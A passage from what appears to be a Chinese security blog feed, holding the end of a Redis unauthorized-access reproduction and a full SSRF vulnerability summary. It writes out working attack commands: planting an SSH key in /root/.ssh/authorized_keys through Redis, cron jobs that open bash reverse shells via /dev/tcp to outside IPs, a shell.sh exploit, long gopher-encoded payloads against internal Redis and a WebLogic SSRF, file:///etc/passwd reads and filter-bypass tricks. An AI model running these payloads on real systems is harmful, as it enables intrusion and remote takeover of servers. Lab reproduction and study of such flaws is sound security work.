alt="image-20220430180643451"></p><p>测试一下，可以成功连接</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430181012266.png" alt="image-20220430181012266"></p><h2 id="2-通过写入ssh公钥实现ssh登录"><a href="#2-通过写入ssh公钥实现ssh登录" class="headerlink" title="2.通过写入ssh公钥实现ssh登录"></a><strong>2.通过写入ssh公钥实现ssh登录</strong></h2><p>到这一步，我使用的阿里云服务器出了问题，就自己搭建个靶机(centos 7)吧.</p><p>记得关闭防火墙:</p><pre><code>sudo systemctl stop firewalld</code></pre><p>原理:在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key.</p><p>扩展:</p><p><strong>ssh免密登录流程:</strong></p><p>　　（1） 首先在客户端生成一对密钥（ssh-keygen）；</p><p>　　（2） 并将客户端的公钥ssh-copy-id 拷贝到服务端；</p><p>　　（3） 当客户端再次发送一个连接请求，包括ip、用户名；</p><p>　　（4） 服务端得到客户端的请求后，会到authorized_keys中查找，如果有响应的IP和用户，就会随机生成一个字符串，例如：qwer；</p><p>　　（5） 服务端将使用客户端拷贝过来的公钥进行加密，然后发送给客户端；</p><p>　　（6） 得到服务端发来的消息后，客户端会使用私钥进行解密，然后将解密后的字符串发送给服务端；</p><p>　　（7） 服务端接受到客户端发来的字符串后，跟之前的字符串进行对比，如果一致，就允许免密码登录。</p><p><strong>攻击流程:</strong></p><p><strong>1、首先在攻击机(kali)上生成ssh公钥</strong></p><pre><code>ssh-keygen -t rsa</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430191709018.png" alt="image-20220430191709018"></p><p><strong>2.将公钥写入key.txt文件（前后用\n换行，避免和redis里其他缓存数据混合）</strong></p><p> 进入.ssh目录：</p><pre><code>cd /root/.ssh</code></pre><p>写入文件：</p><pre><code>(echo -e”\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430192233869.png" alt="image-20220430192233869"></p><p><strong>3.将key.txt写靶机（使用redis-cli -h ip命令连接靶机，写入文件）</strong></p><pre><code>cat key.txt|redis-cli -h 192.168.0.106 -x set crack</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221009845.png" alt="image-20220430221009845"></p><p>4.远程登录靶机的Redis服务</p><pre><code>redis-cli -h 192.168.0.106</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221026832.png" alt="image-20220430221026832"></p><p>5.更改redis备份路径为ssh公钥存放目录(一般默认为/root/.ssh)</p><pre><code>config set dir /root/.ssh</code></pre><p>6.设置上传公钥的备份文件名字为authorized_keys</p><pre><code>config set dbfilename authorized_keysconfig get dbfilename</code></pre><p>7.保存</p><pre><code>save</code></pre><p>8.在攻击机上直接ssh免密登录靶机,免密登录成功</p><pre><code>ssh -i id_rsa root@192.168.0.106</code></pre><p>最后我没有成功，但大致思路是这样，一直不成功我就先不纠结了。</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1576831989_5dfc8bf50878a.png!small" alt="img"></p><h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a><strong>3.反弹shell</strong></h2><pre><code>redis-cli -h 192.168.0.106set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.108/4444 0&gt;&amp;1\n\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220501003825941.png" alt="image-20220501003825941"></p><p>成功反弹</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞总结</title>
      <link href="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>最近碰到了挺多SSRF题目的应用，以前学的太浅了，重新学习下，打好基础。</p><p>[TOC]</p><h1 id="SSRF漏洞简介"><a href="#SSRF漏洞简介" class="headerlink" title="SSRF漏洞简介"></a>SSRF漏洞简介</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。<br> 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）<br> <img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095630-ae7ee364-6d72-1.png" alt="img"></p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p> SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。<br> 如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用<code>存在缺陷的web应用作为代理</code>攻击远程和本地的服务器。</p><h2 id="漏洞易发生点"><a href="#漏洞易发生点" class="headerlink" title="漏洞易发生点"></a>漏洞易发生点</h2><ol><li>转码服务</li><li>在线翻译</li><li>图片加载与下载(通过URL地址加载或下载图片)</li><li>图片、文章收藏功能</li><li>网站采集、网页抓取的地方。</li><li>头像的地方。(远程加载头像)</li><li>一切要你输入网址的地方和可以输入ip的地方。</li><li>从URL关键字中寻找：<code>share</code>、<code>wap</code>、<code>url</code>、<code>link</code>、<code>src</code>、<code>source</code>、<code>target</code>、<code>u</code>、<code>3g</code>、<code>display</code>、<code>sourceURl</code>、<code>imageURL</code>、<code>domain</code><br> …</li></ol><h2 id="可以实现的攻击"><a href="#可以实现的攻击" class="headerlink" title="可以实现的攻击"></a>可以实现的攻击</h2><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<a href="https://www.cnblogs.com/yuanshu/p/11588341.html">banner 信息</a></li><li>攻击运行在内网或本地的应用程序</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li><li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li><li>进行跳板</li><li>无视cdn</li><li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li></ol><h1 id="SSRF漏洞相关的函数和协议"><a href="#SSRF漏洞相关的函数和协议" class="headerlink" title="SSRF漏洞相关的函数和协议"></a>SSRF漏洞相关的函数和协议</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p><p>（1）file_get_contents()</p><pre><code class="php">&lt;?php$url = $_GET[&#39;url&#39;];;echo file_get_contents($url);?&gt;</code></pre><blockquote><p><code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p></blockquote><p>（2）fsockopen()</p><pre><code>&lt;?php function GetFile($host,$port,$link) &#123;     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);       if (!$fp) &#123;         echo &quot;$errstr (error number $errno) \n&quot;;     &#125; else &#123;         $out = &quot;GET $link HTTP/1.1\r\n&quot;;         $out .= &quot;Host: $host\r\n&quot;;         $out .= &quot;Connection: Close\r\n\r\n&quot;;         $out .= &quot;\r\n&quot;;         fwrite($fp, $out);         $contents=&#39;&#39;;         while (!feof($fp)) &#123;             $contents.= fgets($fp, 1024);         &#125;         fclose($fp);         return $contents;     &#125; &#125;?&gt;</code></pre><blockquote><p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p></blockquote><p>（3）curl_exec()</p><pre><code>&lt;?php if (isset($_POST[&#39;url&#39;]))&#123;    $link = $_POST[&#39;url&#39;];    $curlobj = curl_init();// 创建新的 cURL 资源    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源    $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;    file_put_contents($filename, $result);     echo $result;&#125;?&gt;</code></pre><blockquote><p><code>curl_exec</code>函数用于执行指定的cURL会话</p></blockquote><p><strong>注意</strong></p><pre><code>1.一般情况下PHP不会开启fopen的gopher wrapper2.file_get_contents的gopher协议不能URL编码3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用5.curl_exec() //默认不跟踪跳转，6.file_get_contents() // file_get_contents支持php://input协议</code></pre><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p> （1）<code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容<br> （2）<code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br> （3）<code>gopher</code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br> （4）<code>http/s</code>：探测内网主机存活</p><h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机:kali、远程vps</p><p>目标机:阿里云</p><p>docker镜像：ssrf_redis</p><p>PHP版本：PHP Version 7.2.28(5.6版本测试会失败)</p><p>这里我直接使用宝塔来搭建靶机，注意，需要关闭open_basedir，否则会导致file协议失效</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424204936132.png" alt="image-20220424204936132"></p><h2 id="远程利用示例代码"><a href="#远程利用示例代码" class="headerlink" title="远程利用示例代码"></a>远程利用示例代码</h2><p>ssrf.php</p><pre><code class="php">&lt;?php$ch = curl_init(); //创建新的 cURL 资源curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); //设置URL 和相应的选项#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch); //抓取 URL 内容并把它传递给浏览器，存储进文件curl_close($ch); ////关闭 cURL 资源，并且释放系统资源?&gt;</code></pre><p>post.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;    &lt;title&gt;post&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;?php    echo $_REQUEST[cmd];    ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="远程利用方式"><a href="#远程利用方式" class="headerlink" title="远程利用方式"></a>远程利用方式</h2><p><strong>1.利用file协议读取</strong></p><pre><code>http://39.xx.xx.xx:66/ssrf.php?url=file:///etc/passwd</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424210730715.png" alt="image-20220424210730715"></p><p>一般探测内网会读一下:</p><pre><code>http://39.xx.xx.xx:66/ssrf.php?url=file:///proc/net/arp</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424211134080.png" alt="image-20220424211134080"></p><p><strong>2.利用dict协议</strong></p><p>（1）查看端口及端口上运行服务的版本信息</p><pre><code>http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424211349497.png" alt="image-20220424211349497"></p><p>（2）通过dict协议getshell</p><p>有关dict协议：向服务器的端口请求 命令:参数，并在末尾自动补上<code>\r\n</code>(CRLF)<br>                          dict协议要一条一条的执行，而gopher协议执行一条命令就行了</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095631-af0958b4-6d72-1.jpg" alt="img"></p><p><strong>3.利用gopher协议</strong></p><p>  (1)攻击内网redis并反弹shell</p><p>利用redis未授权访问攻击redis<br> <code>攻击redis的exp</code></p><p>shell.sh</p><pre><code>echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/108.166.201.16/4444 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit</code></pre><p>使用这个exp随意一个目标，捕获到数据</p><pre><code>bash shell.sh 39.x.x.x 6379</code></pre><p>再对数据进行一些转换</p><p> 转换规则：<br> 如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。<br> 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。<br> 将<code>\r</code>字符串替换成<code>%0d%0a</code><br> 空白行替换为<code>%0a</code></p><p>结合gopher协议攻击内网redis，使用上边捕获数据的转换结果即可，然后进行反弹shell：</p><pre><code>curl -v &#39;http://39.105.71.63:66/ssrf.php?url=gopher://127.0.0.1:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f108.166.201.16%2f4444%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af32d162-6d72-1.jpg" alt="img"></p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af5bb41a-6d72-1.jpg" alt="img"></p><p>诶，搞这个redis老是把我服务器搞崩，我就不复现了。</p><p>（2）伪造post请求反弹shell</p><pre><code>curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261&#39;</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095632-af8614a8-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af8614a8-6d72-1.jpg" alt="img"></a><br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095632-afabc5e0-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-afabc5e0-6d72-1.jpg" alt="img"></a><br> 反弹成功<br> <code>192.168.1.5</code>是内网Web服务，有post.php</p><p><strong>4 .利用<code>http/s</code>协议</strong><br> 探测内网主机存活</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095633-aff15a38-6d72-1.jpg" alt="img"></p><p>说明内网ip为<code>192.168.1.3</code>的主机存活</p><h1 id="SSRF应用攻击实战"><a href="#SSRF应用攻击实战" class="headerlink" title="SSRF应用攻击实战"></a>SSRF应用攻击实战</h1><h2 id="1、gopher攻击redis"><a href="#1、gopher攻击redis" class="headerlink" title="1、gopher攻击redis"></a><strong>1、gopher攻击redis</strong></h2><p>参考<strong>远程利用 3.利用<code>gopher</code>协议</strong></p><h2 id="2、weblogic-ssrf攻击redis"><a href="#2、weblogic-ssrf攻击redis" class="headerlink" title="2、weblogic ssrf攻击redis"></a><strong>2、weblogic ssrf攻击redis</strong></h2><p>下载地址：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br> 编译并启动环境</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p><p> <strong>1.查看端口</strong><br> 访问</p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80//测试http://127.0.0.1:7001：将80替换成7001</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095633-b02c20b4-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095633-b02c20b4-6d72-1.jpg" alt="img"></a><br> not connect，说明80端口未开放<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b05a47d2-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b05a47d2-6d72-1.jpg" alt="img"></a><br> 返回404，说明端口开放<br> <strong>2.探测内网主机存活</strong><br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b09834c0-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b09834c0-6d72-1.jpg" alt="img"></a><br> 说明内网ip为<code>192.168.1.1</code>的主机存活<br> <strong>3.注入HTTP头，利用Redis反弹shell</strong><br> 通过ssrf探测内网中的redis服务器，发现172.22.0.2:6379可以连通<br> 和上边的远程利用几乎一样。<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b0c0075c-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b0c0075c-6d72-1.jpg" alt="img"></a><br> 将反弹shell脚本写入/etc/crontab定时任务</p><pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n&quot;config set dir /etc/config set dbfilename crontabsave</code></pre><p>进行url编码</p><pre><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</code></pre><p>换行符是“\r\n”换成“%0D%0A”。将url编码后的字符串放在ssrf的域名后面，发送<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095635-b0fc12ec-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095635-b0fc12ec-6d72-1.jpg" alt="img"></a><br> 反弹成功<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095635-b1233318-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095635-b1233318-6d72-1.jpg" alt="img"></a></p><h1 id="SSRF漏洞相关绕过"><a href="#SSRF漏洞相关绕过" class="headerlink" title="SSRF漏洞相关绕过"></a>SSRF漏洞相关绕过</h1><h2 id="1、常用绕过方法"><a href="#1、常用绕过方法" class="headerlink" title="1、常用绕过方法"></a><strong>1、常用绕过方法</strong></h2><p><strong>1.@</strong></p><pre><code>http://abc@127.0.0.1实际上是以用户名abc连接到站点127.0.0.1，同理http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8</code></pre><p>在对@解析域名中，不同的处理函数存在处理差异，如：<br> <code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br> 在PHP的<code>parse_url</code>中会识别<a href="http://www.ccc.com,而`libcur`l则识别为www.bbb.com/">www.ccc.com，而`libcur`l则识别为www.bbb.com</a><br> <strong>2.利用[::]</strong><br> 可以利用<code>[::]</code>来绕过localhost</p><pre><code>http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre><p><strong>3.添加端口号</strong></p><pre><code>http://127.0.0.1:8080</code></pre><p><strong>4.利用短网址</strong><br> <a href="http://tool.chinaz.com/tools/dwz.aspx">站长工具短网址</a><br> <a href="http://dwz.cn/">百度短网址</a><br> <strong>5.利用特殊域名</strong><br> 原理是DNS解析。xip.io可以指向任意域名，即</p><pre><code>127.0.0.1.xip.io，可解析为127.0.0.1</code></pre><p><strong>6.利用DNS解析</strong><br> 在域名上设置A记录，指向127.0.1<br> <strong>7.利用进制转换</strong></p><blockquote><p>127.0.0.1<br> 八进制：0177.0.0.1<br> 十六进制：0x7f.0.0.1<br> 十进制：2130706433</p></blockquote><p><strong>8.句号</strong></p><pre><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></pre><p><strong>9.302跳转</strong><br> 使用<a href="https://tinyurl.com生成302跳转地址/">https://tinyurl.com生成302跳转地址</a></p><h2 id="2、常见限制"><a href="#2、常见限制" class="headerlink" title="2、常见限制"></a>2、常见限制</h2><p><strong>1.限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</strong><br> 采用http基本身份认证的方式绕过。即@<br> <code>http://www.xxx.com@www.xxc.com</code><br> <strong>2.限制请求IP不为内网地址</strong><br> 当不允许ip为内网地址时<br> （1）采取短网址绕过<br> （2）采取特殊域名<br> （3）采取进制转换<br> <strong>3.限制请求只为http协议</strong><br> （1）采取302跳转<br> （2）采取短地址</p><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="file协议读不出文件"><a href="#file协议读不出文件" class="headerlink" title="file协议读不出文件"></a>file协议读不出文件</h2><p><strong>1、权限不够：</strong>当前用户对此文件没有可读权限</p><p><strong>2、路径输错了：</strong>linux系统中，file之后加路径是三个斜线，不能少：比如file:///etc/passwd（其实就是file://和/etc/passwd的组合）</p><p><strong>3、存在open_basedir：</strong>当open_basedir配置有值时，curl_exec不能使用file协议，并不是受open_basedir的值限制某些文件读不了，而是整个file协议都不能用。这是写在php的curl_exec源码里的，目前没找到绕过的方式。</p><p><img src="SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/imgpxy.phpurl=gnp=tmf_xw?046/ggmKrbiSh4fnScisOQkEciAqDHuDaiP4O9yu4IKOIoGIQOcJsNSvHK2ZHqk2EDyWEE0URtdEaiMUsdzaihmE7VJTI3bU/gnp_zibmm/nc.cipq.zibmm//:sptth" alt="img"></p><p><strong>4、php源码不显示：</strong>读取php源码，即使读成功了也不会在浏览器里回显（类似html的注释一样），要在返回包里或者view-source中去看。</p><p><img src="SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/imgpxy.phpurl=gnp=tmf_xw?046/AVOy6sdVuBHuoZ3dYmxMwTBApWe0dmkwyeSQcppVaiav5oIkWuzgY0Ek2EDyWEE0URtdEaiMUsdzaihmE7VJTI3bU/gnp_zibmm/nc.cipq.zibmm//:sptth" alt="img"></p><p><strong>5、不回显的ssrf：</strong>代码没写echo，返回值赋到变量里，读成功了你也看不到。</p><h2 id="gopher协议和dict协议发不出包"><a href="#gopher协议和dict协议发不出包" class="headerlink" title="gopher协议和dict协议发不出包"></a>gopher协议和dict协议发不出包</h2><p>自己在虚拟机搭的测试环境有一个很奇怪的现象，http/s和file协议都能正常使用，但是<strong>不能指定端口</strong>及<strong>使用gopher和dict协议</strong>，否则就只能发出dns请求，却不能建立tcp的连接（dnslog可以收到请求，nc收不到）。</p><p>后面查阅了很多资料，并没有找到明确的答案，只有一个疑似可能的原因：php在编译时没有使用**-with-curlwrappers**参数会导致这个问题。不过这个参数貌似在高版本被去掉了，所以应该只影响低版本php吧。</p><p>在实战中如果遇到这个问题，总不能登目标机器把php重新编译一下吧……（动作太大了，而且都能登机器了还要ssrf有什么用呢），目前没找到什么办法绕过。</p><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><p>测试一下各协议对特殊符号的支持，中文符号不测试，测试的所有符号如下：</p><p>`~!@#$%^&amp;*()_-+=/|&#39;“;:&lt;&gt;,.?{}[]</p><p><strong>【gopher协议】</strong></p><p><strong>正常符号：</strong>直接传，一次二次url编码都可以</p><p><strong>%</strong> 直接传可以，但后面接16进制字符就会转义，一次url编码后还是不能接16进制，二次url编码可以</p><p><strong>#</strong> 会截断，一次url编码绕不过，二次url编码后可以</p><p><strong>&amp;</strong> 会截断，一次url编码可以，二次url编码也可以</p><p><strong>+</strong> 会变成空格，一次二次url编码后都可以</p><p><strong>【dict协议】</strong></p><p><strong>正常符号：</strong>直接传，一次url编码可以，二次url编码不行（不支持二次解码）</p><p>以下均不支持二次url解码</p><p><strong>%</strong> 直接传可以，后面接16进制不行会转义，一次url编码后可以</p><p><strong>#</strong> 会截断，一次url编码绕不过</p><p><strong>&amp;</strong> 会截断，一次url编码可以</p><p><strong>?</strong> 会截断，一次url编码绕不过</p><p><strong>+</strong> 会变成空格，一次url编码可以</p><p><strong>:</strong> 会变成空格，一次url编码绕不过</p><p><strong>【http/s协议】</strong></p><p><strong>正常符号：</strong>直接传，一次url编码可以，二次url编码不行（不支持二次解码）</p><p>以下均不支持二次url解码</p><p><strong>%</strong> 直接传可以，后面接16进制不行会转义，一次url编码后可以</p><p><strong>#</strong> 会截断，一次url编码绕不过</p><p><strong>&amp;</strong> 会截断，一次url编码可以</p><p><strong>+</strong> 会变成空格，一次url编码可以</p><p><strong>【总结】</strong></p><p>**%#&amp;+**符号容易出问题</p><p><strong>dict协议</strong>额外不支持**?:**两个符号，url编码无法绕过</p><p><strong>一次url编码</strong>可以绕过**%&amp;+<strong>三种符号，不能绕过</strong>#**</p><p>**gopher协议的%**需要编码两次绕过，只一次不行</p><p><strong>gopher</strong>万能协议，<strong>支持二次url解码</strong>，没有绕不过的特殊符号。</p><h1 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h1><p>1、禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和https请求<br> 2、统一错误信息，防止根据错误信息判断端口状态<br> 3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址<br> 4、设置URL白名单或者限制内网IP</p><p>参考:</p><p><a href="http://www.hackdig.com/07/hack-419420.htm">http://www.hackdig.com/07/hack-419420.htm</a></p><p><a href="https://xz.aliyun.com/t/7405#toc-2">https://xz.aliyun.com/t/7405#toc-2</a></p><p>后面我摆烂了，服务器老是坏，等有时间继续复现把，先抄下大佬的文章。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2的简单复现</title>
      <link href="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/</url>
      
